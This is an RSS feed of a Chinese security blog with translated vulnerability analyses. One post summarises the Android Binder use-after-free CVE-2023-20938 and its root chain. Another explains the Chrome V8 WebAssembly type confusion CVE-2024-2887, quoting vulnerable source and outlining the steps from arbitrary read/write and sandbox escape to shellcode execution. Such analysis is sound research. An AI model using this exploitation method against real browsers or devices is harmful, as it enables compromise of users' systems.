<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Pico Org</title><description>Pico组织博客</description><link>https://picoorg.github.io/</link><language>zh_CN</language><item><title>Android漏洞分析</title><link>https://picoorg.github.io/posts/android-framework%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/</link><guid isPermaLink="true">https://picoorg.github.io/posts/android-framework%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/</guid><pubDate>Wed, 15 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Android简介&lt;/h1&gt;
&lt;h1&gt;Android Binder&lt;/h1&gt;
&lt;h1&gt;Bundle mismatch&lt;/h1&gt;
&lt;h1&gt;LaunchAnyWhere&lt;/h1&gt;
&lt;h1&gt;Android WebView jsbridge&lt;/h1&gt;
&lt;h1&gt;参考文献&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://tech.meituan.com/2017/09/14/android-binde-kcon.html&quot;&gt;Android Binder漏洞挖掘技术与案例分享&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://colbert337.github.io/2015/08/24/android-attack-surface/&quot;&gt;Android Attack Surface&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded></item><item><title>攻击Android Binder：CVE-2023-20938 的分析与利用</title><link>https://picoorg.github.io/posts/cve-2023-20938/</link><guid isPermaLink="true">https://picoorg.github.io/posts/cve-2023-20938/</guid><description>本文主要翻译了Google博客内容，水平有限以理解为主。</description><pubDate>Fri, 07 Jun 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;背景&lt;/h1&gt;
&lt;p&gt;本文分析了如何利用&lt;code&gt;CVE-2023-20938&lt;/code&gt;漏洞进行&lt;code&gt;Android Binder&lt;/code&gt;攻击，该漏洞是&lt;code&gt;Binder&lt;/code&gt;设备驱动的&lt;code&gt;UAF&lt;/code&gt;漏洞，最终以非可信&lt;code&gt;APP&lt;/code&gt;在最新安卓设备上获取&lt;code&gt;root&lt;/code&gt;权限，&lt;code&gt;5.4-5.10&lt;/code&gt;版本的&lt;code&gt;GKI&lt;/code&gt;内核均受影响。&lt;/p&gt;
&lt;h2&gt;Binder&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Binder&lt;/code&gt;是&lt;code&gt;Android&lt;/code&gt;上主要的进程间通信机制，支持进程间传递文件描述符和包含指针的对象，由用户空间库&lt;code&gt;libbinder&lt;/code&gt;和&lt;code&gt;libhwbinder&lt;/code&gt;，以及&lt;code&gt;Android&lt;/code&gt;公共内核中的内核驱动程序组成，接口可由&lt;code&gt;AIDL&lt;/code&gt;定义。&lt;code&gt;Binder&lt;/code&gt;设备驱动在&lt;code&gt;/dev/binder&lt;/code&gt;，&lt;code&gt;Andoird&lt;/code&gt;所有非可信&lt;code&gt;APP&lt;/code&gt;都经过沙盒处理，进程间通信是通过&lt;code&gt;Binder&lt;/code&gt;实现的。尤其是&lt;code&gt;Chrome&lt;/code&gt;渲染进程被分配&lt;code&gt;SELinux&lt;/code&gt;更严格的&lt;code&gt;isolated_app&lt;/code&gt;上下文，但仍然可以通过&lt;code&gt;Binder&lt;/code&gt;实现进程间通信。所以，&lt;code&gt;Binder&lt;/code&gt;呈现出更广泛的攻击面。&lt;/p&gt;
&lt;h2&gt;Binder历史漏洞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2019-2025&lt;/li&gt;
&lt;li&gt;CVE-2019-2215&lt;/li&gt;
&lt;li&gt;CVE-2020-0041&lt;/li&gt;
&lt;li&gt;CVE-2020-0423&lt;/li&gt;
&lt;li&gt;CVE-2022-20421&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为了实现高性能&lt;code&gt;IPC&lt;/code&gt;，&lt;code&gt;Binder&lt;/code&gt;包含极其复杂的对象生命周期、内存管理和并发线程模型。为了了解这种复杂性，我们统计了三种不同类型的并发同步原语（5个锁、6个引用计数器和一些原子变量），它们都在实现驱动程序的同一个文件中使用。出于性能原因，&lt;code&gt;Binder&lt;/code&gt;中的锁定也非常细粒度，进一步增加了代码的复杂性。&lt;/p&gt;
&lt;p&gt;近年来，利用几个&lt;code&gt;Binder&lt;/code&gt;的成功利用主要是由&lt;code&gt;UAF&lt;/code&gt;漏洞引起的。这些错误的根本原因多种多样，包括不当的清理逻辑（&lt;code&gt;CVE-2019-2215&lt;/code&gt;和&lt;code&gt;CVE-2022-20421&lt;/code&gt;）、数据竞争（&lt;code&gt;CVE-2020-0423&lt;/code&gt;）和对象越界访问（&lt;code&gt;CVE-2020-0041&lt;/code&gt;）。本博客提供了有关 UAF 问题的信息，该问题是由于处理 Binder 事务时清理实施不当而导致的引用计数错误。&lt;/p&gt;
&lt;p&gt;漏洞分析：&lt;/p&gt;
&lt;p&gt;漏洞是一个使用后释放（Use-After-Free, UAF）问题，由于在处理Binder事务时的不当清理实现导致引用计数错误。
详细分析了用户空间程序如何与Binder交互，以及如何通过特定的ioctl调用来发送和接收事务。
漏洞利用：&lt;/p&gt;
&lt;p&gt;利用UAF漏洞减少特定binder_node的引用计数，导致该对象被释放，但留下悬挂指针。
利用悬挂指针实现有限的泄漏原语（leak primitive），泄漏16字节的内核堆信息。
利用泄漏的信息实现解链原语（unlink primitive），覆盖内核内存。
结合泄漏和解链原语实现任意读取原语（arbitrary read primitive），用于识别要覆盖的内核结构的地址。
提权演示：&lt;/p&gt;
&lt;p&gt;演示了如何利用这些原语来获取root权限，包括禁用SELinux、绕过seccomp等。
漏洞修复和结论：&lt;/p&gt;
&lt;p&gt;漏洞在2023年2月和7月的Android安全公告中得到了修复。
特别感谢了多位技术专家对本文的支持和审阅。
附加信息：&lt;/p&gt;
&lt;p&gt;提供了关于如何实现任意写原语（arbitrary write primitive）的额外信息。
解释了binder_node的引用计数机制。&lt;/p&gt;
&lt;h1&gt;参考文献&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://androidoffsec.withgoogle.com/posts/attacking-android-binder-analysis-and-exploitation-of-cve-2023-20938/&quot;&gt;Attacking Android Binder: Analysis and Exploitation of CVE-2023-20938&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=U-xSM159YLI&quot;&gt;OffensiveCon24 - Eugene Rodionov,Zi Fan Tan and Gulshan Singh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://androidoffsec.withgoogle.com/posts/attacking-android-binder-analysis-and-exploitation-of-cve-2023-20938/offensivecon_24_binder.pdf&quot;&gt;How to Fuzz Your Way to Android Universal Root&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2019ams/materials/D2T2%20-%20Binder%20-%20The%20Bridge%20to%20Root%20-%20Hongli%20Han%20&amp;amp;%20Mingjian%20Zhou.pdf&quot;&gt;Android Binder: The Bridge To Root&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=l38YQxrk7V8&quot;&gt;#HITB2019AMS D2T2 - Binder: The Bridge To Root - Hongli Han and Mingjian Zhou&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html&quot;&gt;Bad Binder: Android In-The-Wild Exploit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=TAwQ4ezgEIo&quot;&gt;OffensiveCon20 - Maddie Stone - Bad Binder: Finding an Android In The Wild 0day&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/&quot;&gt;Exploiting CVE-2020-0041 - Part 1: Escaping the Chrome Sandbox&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Typhoon-Mangkhut-One-Click-Remote-Universal-Root-Formed-With-Two-Vulnerabilities.pdf&quot;&gt;Typhoon Mangkhut: One-click Remote Universal Root Formed with Two Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=a1vyt6iWmS4&quot;&gt;Typhoon Mangkhut: One-click Remote Universal Root Formed with Two Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://0xkol.github.io/assets/files/Racing_Against_the_Lock__Exploiting_Spinlock_UAF_in_the_Android_Kernel.pdf&quot;&gt;Racing Against the Lock: Exploiting Spinlock UAF in the Android Kernel&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=E3CVDOlcHC4&quot;&gt;OffensiveCon23 - Moshe Kol - Racing Against the Lock: Exploiting Spinlock UAF in the Android Kernel&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded></item><item><title>CVE-2024-2887 Chrome Type Confusion漏洞分析</title><link>https://picoorg.github.io/posts/cve-2024-2887/</link><guid isPermaLink="true">https://picoorg.github.io/posts/cve-2024-2887/</guid><description>本文主要翻译了ZDI博客内容，水平有限以理解为主，后续计划增补PoC和补丁分析。</description><pubDate>Wed, 08 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-%E7%AE%80%E4%BB%8B&quot;&gt;1. 简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0&quot;&gt;2. 漏洞成因&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8&quot;&gt;3. 漏洞利用&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#31-%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4&quot;&gt;3.1. 漏洞影响范围&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#32-%E9%80%9A%E7%94%A8webassembly-type-confusion&quot;&gt;3.2. 通用WebAssembly type confusion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#33-%E6%95%B4%E6%95%B0%E4%B8%8B%E6%BA%A2%E5%AF%BC%E8%87%B4v8%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8&quot;&gt;3.3. 整数下溢导致V8沙箱逃逸&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#34-%E4%BB%BB%E6%84%8Fshellcode%E6%89%A7%E8%A1%8C&quot;&gt;3.4. 任意Shellcode执行&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99&quot;&gt;4. 参考资料&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;1. 简介&lt;/h1&gt;
&lt;p&gt;原文主要是介绍Pwn2Own的Master of Pwn获奖者Manfred Paul的漏洞发现和漏洞利用过程，该漏洞类型为&lt;code&gt;type confusion&lt;/code&gt;，可同时在Chrome和Edge (Chromium)触发。&lt;/p&gt;
&lt;p&gt;漏洞存在于V8 JavaScript和WebAssembly引擎中，允许绕过V8内存沙箱（&lt;a href=&quot;https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#heading=h.xzptrog8pyxf&quot;&gt;Ubercage&lt;/a&gt;），但受限于基于进程隔离的浏览器沙箱。在演示过程中通过使用--no-sandbox移除了这个限制。&lt;/p&gt;
&lt;h1&gt;2. 漏洞成因&lt;/h1&gt;
&lt;p&gt;WebAssembly模块包含一个&lt;code&gt;Type section&lt;/code&gt;用来给出自定义heap types，在一开始只用来定义&lt;code&gt;function types/aggregate types/external types&lt;/code&gt;三种类型（原文只提到一种类型），但在引入&lt;a href=&quot;https://webassembly.github.io/gc/core/_download/WebAssembly.pdf&quot;&gt;垃圾回收（GC）提案&lt;/a&gt;后，可以定义结构体类型，允许在WebAssembly中使用复合的、堆分配的类型。&lt;/p&gt;
&lt;p&gt;通常，结构体只能引用其前面声明的结构体。但为了支持相互递归的数据结构，新增了一个特性recursive type groups，该特性支持将递归类型组整体声明而不是每个类型单独声明。在该组中，各个类型允许相互引用。&lt;/p&gt;
&lt;p&gt;据此，考虑在&lt;code&gt;v8/src/wasm/module-decoder-impl.h&lt;/code&gt;中负责从WebAssembly解析&lt;code&gt;Type section&lt;/code&gt;的函数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// 调整了一下原文缩进
void DecodeTypeSection() { 
    TypeCanonicalizer* type_canon = GetTypeCanonicalizer(); 
    uint32_t types_count = consume_count(&quot;types count&quot;, kV8MaxWasmTypes); // (1) 
 
    for (uint32_t i = 0; ok() &amp;amp;&amp;amp; i &amp;lt; types_count; ++i) {  
        ... 
        uint8_t kind = read_u8&amp;lt;Decoder::FullValidationTag&amp;gt;(pc(), &quot;type kind&quot;);  
        size_t initial_size = module_-&amp;gt;types.size(); 
        if (kind == kWasmRecursiveTypeGroupCode) { 
            ... 
            uint32_t group_size = 
                    consume_count(&quot;recursive group size&quot;, kV8MaxWasmTypes); 
            ... 
            if (initial_size + group_size &amp;gt; kV8MaxWasmTypes) { // (2)  
                errorf(pc(), &quot;Type definition count exceeds maximum %zu&quot;, 
                    kV8MaxWasmTypes);  
                return; 
            } 
            ... 
            for (uint32_t j = 0; j &amp;lt; group_size; j++) { 
                ... 
                TypeDefinition type = consume_subtype_definition(); 
                module_-&amp;gt;types[initial_size + j] = type; 
            } 
            ... 
        } else { 
            ... 
            // Similarly to above, we need to resize types for a group of size 1. 
            module_-&amp;gt;types.resize(initial_size + 1); // (3) 
            module_-&amp;gt;isorecursive_canonical_type_ids.resize(initial_size + 1); 
            TypeDefinition type = consume_subtype_definition(); 
            if (ok()) {  
                module_-&amp;gt;types[initial_size] = type; 
                type_canon-&amp;gt;AddRecursiveSingletonGroup(module_.get()); 
            } 
        }  
    } 
    ...  
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在（1）处，&lt;code&gt;kV8MaxWasmTypes = 1,000,000&lt;/code&gt;限制了&lt;code&gt;Type section&lt;/code&gt;的声明总数。在（2）处进一步检查了递归类型组的大小是否超出了限制。&lt;/p&gt;
&lt;p&gt;然而在（2）处的检查是不够的，假设在&lt;code&gt;Type section&lt;/code&gt;有两种类型声明，一种是恰好包含kV8MaxWasmTypes数量的递归类型组，另一种是非递归类型组的类型。那么（1）处的检查能够通过，因为总数为2，（2）处的检查只有第一种声明会进入，且数值刚好等于kV8MaxWasmTypes。但是在（3）处，另一种类型声明刚好触发resize，值为&lt;code&gt;kV8MaxWasmTypes + 1&lt;/code&gt;，被分配到的索引为&lt;code&gt;kV8MaxWasmTypes&lt;/code&gt;。如果有更多的非递归类型组类型声明，只会超出限制更多。&lt;/p&gt;
&lt;h1&gt;3. 漏洞利用&lt;/h1&gt;
&lt;h2&gt;3.1. 漏洞影响范围&lt;/h2&gt;
&lt;p&gt;结合V8处理WebAssembly的heap types的方式，该漏洞可以构造出非常强大的漏洞利用原语，在&lt;code&gt;v8/src/wasm/value-type.h&lt;/code&gt;中，heap types的定义如下:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class HeapType { 
    public: 
        enum Representation : uint32_t { kFunc = kV8MaxWasmTypes, 
            kEq, 
            kI31, 
            kStruct, 
            kArray, 
            kAny, 
            kExtern, 
            ... 
            kNone, 
            ... 
        };
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此处，V8假设所有用户定义的堆类型都被分配小于&lt;code&gt;kV8MaxWasmTypes&lt;/code&gt;的索引。此时，较大的索引保留给固定的内部类型，导致我们可以使用内部类型对自定义类型定义别名，导致大量的&lt;code&gt;type confusion&lt;/code&gt;机会。&lt;/p&gt;
&lt;h2&gt;3.2. 通用WebAssembly type confusion&lt;/h2&gt;
&lt;p&gt;达成&lt;code&gt;type confusion&lt;/code&gt;，我们首先考虑&lt;code&gt;struct.new&lt;/code&gt;操作，它生成新结构体对象的引用，参数来自于栈上数据。调用者通过传递其类型索引来指定所需的结构类型。对类型索引的检查可以在&lt;code&gt;v8/src/wasm/function-body-decoder-impl.h&lt;/code&gt;中找到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bool Validate(const uint8_t* pc, StructIndexImmediate&amp;amp; imm) {  
    if (!VALIDATE(module_-&amp;gt;has_struct(imm.index))) { 
        DecodeError(pc, &quot;invalid struct index: %u&quot;, imm.index); 
        return false;  
    } 
    imm.struct_type = module_-&amp;gt;struct_type(imm.index); 
    return true;  
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来的验证逻辑是&lt;code&gt;has_struct()&lt;/code&gt;函数在&lt;code&gt;v8/src/wasm/wasm-module.h&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bool has_struct(uint32_t index) const { 
    return index &amp;lt; types.size() &amp;amp;&amp;amp; types[index].kind == TypeDefinition::kStruct;  
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于我们可以使&lt;code&gt;types.size() &amp;gt; kV8MaxWasmTypes&lt;/code&gt;，因此即使传递大于该值的索引，也可以使检查通过。这允许我们创建任意内部类型的引用，该引用指向我们可以自定义的结构。&lt;/p&gt;
&lt;p&gt;另一方面，考虑&lt;code&gt;ref.cast&lt;/code&gt;指令的处理：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
case kExprRefCast: 
case kExprRefCastNull: {
        ...
        Value obj = Pop();

        HeapType target_type = imm.type;
        ...
        if (V8_UNLIKELY(TypeCheckAlwaysSucceeds(obj, target_type))) {
            if (obj.type.is_nullable() &amp;amp;&amp;amp; !null_succeeds) {
                CALL_INTERFACE(AssertNotNullTypecheck, obj, value);
            } else {
                CALL_INTERFACE(Forward, obj, value);
            }
        }
        ...
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里，可通过构造使&lt;code&gt;TypeCheckAlwaysSucceeds&lt;/code&gt;函数返回&lt;code&gt;true&lt;/code&gt;来避免类型检查，并且该值将被简单地解释为目标类型。函数&lt;code&gt;TypeCheckAlwaysSucceeds&lt;/code&gt;最终调用&lt;code&gt;v8/src/wasm/wasm-subtyping.cc&lt;/code&gt;中定义的 &lt;code&gt;IsHeapSubtypeOfImpl&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;V8_NOINLINE V8_EXPORT_PRIVATE bool IsHeapSubtypeOfImpl( 
    HeapType sub_heap, HeapType super_heap, 
    const WasmModule* sub_module, const WasmModule* super_module) { 
    if (IsShared(sub_heap, sub_module) != IsShared(super_heap, super_module)) { 
        return false;  
    } 
    HeapType::Representation sub_repr_non_shared = 
        sub_heap.representation_non_shared(); 
    HeapType::Representation super_repr_non_shared = 
        super_heap.representation_non_shared(); 
    switch (sub_repr_non_shared) {  
        ... 
        case HeapType::kNone: 
            // none is a subtype of every non-func, non-extern and non-exn reference  
            // type under wasm-gc. 
            if (super_heap.is_index()) { 
                return !super_module-&amp;gt;has_signature(super_heap.ref_index()); 
            } 
            ... 
    } 
    ...  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这意味着，如果我们声明的类型索引为常量&lt;code&gt;HeapType::kNone&lt;/code&gt;的别名，那么当我们强制转换为任何非函数、非外部引用时，类型检查将始终被忽略。整体上，我们可以通过以下步骤，将引用类型转换为任意其他引用类型：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在&lt;code&gt;Type section&lt;/code&gt;中，定义一个只有一个&lt;code&gt;anyref&lt;/code&gt;类型字段的结构体，并利用上述漏洞使该结构索引为&lt;code&gt;HeapType::kNone&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;将原始类型的非空引用放在栈顶，并调用&lt;code&gt;struct.new&lt;/code&gt;并将类型索引设置为&lt;code&gt;HeapType::kNone&lt;/code&gt;。（我理解为调用构造函数）&lt;/li&gt;
&lt;li&gt;同时，定义一个只有一个目标类型字段的结构体，该索引小于&lt;code&gt;kV8MaxWasmTypes&lt;/code&gt;。使用&lt;code&gt;ref.cast&lt;/code&gt;将步骤2中实例化的对象转为新结构体类型。&lt;/li&gt;
&lt;li&gt;最后，通过执行&lt;code&gt;struct.get&lt;/code&gt;读存储在结构体中的字段，即步骤2中栈上的引用，该引用已从原始类型转为目标类型。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这种将引用类型转换为任意其他引用类型，然后通过解引用将值类型转换为任意其他值类型 - 因此这是一种通用&lt;code&gt;type confusion&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;特别是，它直接包含几乎所有常见的&lt;code&gt;JavaScript&lt;/code&gt;引擎漏洞利用原语：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将&lt;code&gt;int&lt;/code&gt;转换为&lt;code&gt;int*&lt;/code&gt;，然后解引用会导致任意读取。&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;int&lt;/code&gt;转换为&lt;code&gt;int*&lt;/code&gt;，然后写入该引用会导致任意写入。&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;externref&lt;/code&gt;转换为&lt;code&gt;int&lt;/code&gt;是&lt;code&gt;addrOf()&lt;/code&gt;原语，获取&lt;code&gt;JavaScript&lt;/code&gt;对象的地址。&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;int&lt;/code&gt;转换为&lt;code&gt;externref&lt;/code&gt;是&lt;code&gt;fakeObj()&lt;/code&gt;原语，强制引擎将任意值视为指向&lt;code&gt;JavaScript&lt;/code&gt;对象的指针。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;虽然不允许从&lt;code&gt;HeapType::kNone&lt;/code&gt;转换为&lt;code&gt;externref&lt;/code&gt;，但我们实际上通过包装引用到结构体间接操作完成&lt;code&gt;type confusion&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这些任意读/写仍然包含在V8内存沙箱中，因为所有涉及的指向堆分配结构的指针都已标记，是沙箱化的压缩指针，而不是完整的64位原始指针。&lt;/p&gt;
&lt;h2&gt;3.3. 整数下溢导致V8沙箱逃逸&lt;/h2&gt;
&lt;p&gt;在V8沙箱内，我们可操作空间十分有限，诸如&lt;code&gt;WebAssembly&lt;/code&gt;实例之类的“受信任”对象尚无法被操作，因此仍需进行V8沙箱逃逸。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;JavaScript&lt;/code&gt;引擎漏洞利用的一个常用对象是&lt;code&gt;ArrayBuffer&lt;/code&gt;及其相应views（即&lt;code&gt;TypedArray&lt;/code&gt;），因为它允许直接、无标记地访问某些内存区域。&lt;/p&gt;
&lt;p&gt;为了防止访问V8沙箱外部的指针，用沙箱化指针对&lt;code&gt;TypedArray&lt;/code&gt;进行访问限制。同时，&lt;code&gt;ArrayBuffer&lt;/code&gt;的长度字段始终存在“有限大小访问”限制，本质上是&lt;code&gt;2^53-1&lt;/code&gt;。（参考&lt;a href=&quot;https://stackoverflow.com/questions/17823225/do-arraybuffers-have-a-maximum-length&quot;&gt;StackOverflow&lt;/a&gt;，原文此处有误）&lt;/p&gt;
&lt;p&gt;然而，在现代&lt;code&gt;JavaScript&lt;/code&gt;中，由于引入了可调整大小的&lt;code&gt;ArrayBuffer(RAB)&lt;/code&gt;及其可共享变体、可增长的&lt;code&gt;SharedArrayBuffer(GSAB)&lt;/code&gt;，&lt;code&gt;TypedArray&lt;/code&gt;的处理变得相当复杂。这两种变体都具有在创建对象后更改其长度的能力，并且共享变体被限制为永不缩容。特别是，对于具有此类缓冲区的&lt;code&gt;TypedArray&lt;/code&gt;，数组长度永远无法被缓存，并且必须在每次访问时重新计算。&lt;/p&gt;
&lt;p&gt;此外，&lt;code&gt;ArrayBuffers&lt;/code&gt;还具有一个偏移字段，记录实际底层后备存储中数据的开始，计算长度时必须考虑此偏移。&lt;/p&gt;
&lt;p&gt;以下是在&lt;code&gt;Turbofan&lt;/code&gt;编译器优化后的，负责获取&lt;code&gt;TypedArray&lt;/code&gt;长度的代码，具体在&lt;code&gt;v8/src/compiler/graph-assembler.cc&lt;/code&gt;中：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;TNode&amp;lt;UintPtrT&amp;gt; BuildLength(TNode&amp;lt;JSArrayBufferView&amp;gt; view, 
                              TNode&amp;lt;Context&amp;gt; context) { 
    ... 
    // 3) Length-tracking backed by RAB (JSArrayBuffer stores the length) 
    auto RabTracking = [&amp;amp;]() { 
        TNode&amp;lt;UintPtrT&amp;gt; byte_length = MachineLoadField&amp;lt;UintPtrT&amp;gt;( 
            AccessBuilder::ForJSArrayBufferByteLength(), buffer, UseInfo::Word()); 
        TNode&amp;lt;UintPtrT&amp;gt; byte_offset = MachineLoadField&amp;lt;UintPtrT&amp;gt;( 
            AccessBuilder::ForJSArrayBufferViewByteOffset(), view, 
            UseInfo::Word()); 
    
        return a
            .MachineSelectIf&amp;lt;UintPtrT&amp;gt;( // (1)  
                a.UintPtrLessThanOrEqual(byte_offset, byte_length)) 
            .Then([&amp;amp;]() { 
                // length = floor((byte_length - byte_offset) / element_size) 
                return a.UintPtrDiv(a.UintPtrSub(byte_length, byte_offset),  
                                    a.ChangeUint32ToUintPtr(element_size)); 
            }) 
            .Else([&amp;amp;]() { return a.UintPtrConstant(0); })  
            .ExpectTrue() 
            .Value();  
    };  
 
     // 4) Length-tracking backed by GSAB (BackingStore stores the length) 
    auto GsabTracking = [&amp;amp;]() { 
        TNode&amp;lt;Number&amp;gt; temp = TNode&amp;lt;Number&amp;gt;::UncheckedCast(a.TypeGuard(  
                TypeCache::Get()-&amp;gt;kJSArrayBufferViewByteLengthType, 
                a.JSCallRuntime1(Runtime::kGrowableSharedArrayBufferByteLength, 
                                buffer, context, base::nullopt, 
                                Operator::kNoWrite))); 
            TNode&amp;lt;UintPtrT&amp;gt; byte_length = 
                a.EnterMachineGraph&amp;lt;UintPtrT&amp;gt;(temp, UseInfo::Word()); 
            TNode&amp;lt;UintPtrT&amp;gt; byte_offset = MachineLoadField&amp;lt;UintPtrT&amp;gt;( 
                AccessBuilder::ForJSArrayBufferViewByteOffset(), view, 
        UseInfo::Word());  
        // (2)  
        return a.UintPtrDiv(a.UintPtrSub(byte_length, byte_offset), 
                            a.ChangeUint32ToUintPtr(element_size));  
    };  
    ...  
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于&lt;code&gt;RAB ArrayBuffer&lt;/code&gt;数组，我们可以在(1)中看到长度的计算公式为&lt;code&gt;Floor((byte_length - byte_offset) / element_size)&lt;/code&gt;。但有一个下溢检查，即若&lt;code&gt;byte_offset &amp;gt; byte_length&lt;/code&gt;，则返回0。&lt;/p&gt;
&lt;p&gt;但对于&lt;code&gt;GSAB ArrayBuffer&lt;/code&gt;数组，缺少相应的下溢检查。因此，如果&lt;code&gt;byte_offset &amp;gt; byte_length&lt;/code&gt;，则会发生下溢，并且将返回接近&lt;code&gt;2^64&lt;/code&gt;的无符号64位整型值。由于这两个字段都能在攻击者控制的数组对象中找到，因此我们可以使用前面讨论的沙箱任意读/写原语轻松触发此操作，进而导致可访问整个64位地址空间。&lt;/p&gt;
&lt;h2&gt;3.4. 任意Shellcode执行&lt;/h2&gt;
&lt;p&gt;使用上述两个BUG，利用变得相当简单:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通用&lt;code&gt;WebAssembly type confusion&lt;/code&gt;部分中描述的原语直接给出了V8内存沙箱的任意读/写。&lt;/li&gt;
&lt;li&gt;然后，将其用于操作&lt;code&gt;GSAB SharedArrayBuffer&lt;/code&gt;使其偏移量大于其长度。&lt;/li&gt;
&lt;li&gt;之后，可以使用&lt;code&gt;JIT&lt;/code&gt;编译的读/写函数来访问和覆盖进程地址空间中任何位置的数据。&lt;/li&gt;
&lt;li&gt;最后，&lt;code&gt;WebAssembly&lt;/code&gt;模块的编译代码是覆盖的合适目标，因为它在&lt;code&gt;RWX Page&lt;/code&gt;中，并且可以用&lt;code&gt;shellcode&lt;/code&gt;覆盖。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;4. 参考资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2024-2887&quot;&gt;CVE-2024-2887 Detail - NVD&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome&quot;&gt;CVE-2024-2887: A PWN2OWN WINNING BUG IN GOOGLE CHROME&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/v8/v8&quot;&gt;v8/v8: The official mirror of the V8 Git repository&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#heading=h.xzptrog8pyxf&quot;&gt;V8 Sandbox - High-Level Design Doc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://webassembly.github.io/gc/core/_download/WebAssembly.pdf&quot;&gt;WebAssembly Specification: Release 2.0 + tail calls + function references + gc (Draft 2024-04-28)&lt;/a&gt;&lt;/li&gt;
